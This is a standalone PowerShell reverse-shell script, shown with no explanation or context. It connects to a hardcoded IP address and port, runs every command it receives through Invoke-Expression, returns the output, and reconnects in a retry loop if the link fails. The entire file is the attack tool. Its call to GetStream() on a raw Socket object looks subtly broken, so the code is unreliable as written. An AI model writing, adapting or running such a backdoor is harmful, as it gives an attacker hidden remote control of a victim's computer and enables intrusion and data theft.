$ip = "172.22.238.168"
$port = 4445

function Connect-Back {
    try {
        $socket = New-Object System.Net.Sockets.Socket([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp)
        $socket.Connect($ip, $port)
        $stream = $socket.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.WriteLine("Connected!")
        $writer.Flush()

        while ($true) {
            $cmd = $reader.ReadLine()

            if ($cmd.ToLower() -eq "exit") {
                break
            }

            $output = Invoke-Expression $cmd 2>&1 | Out-String
            $writer.WriteLine($output)
            $writer.Flush()
            Start-Sleep -Seconds 1
        }
    } catch {
        Start-Sleep -Seconds 10
        Connect-Back
    }
}

Connect-Back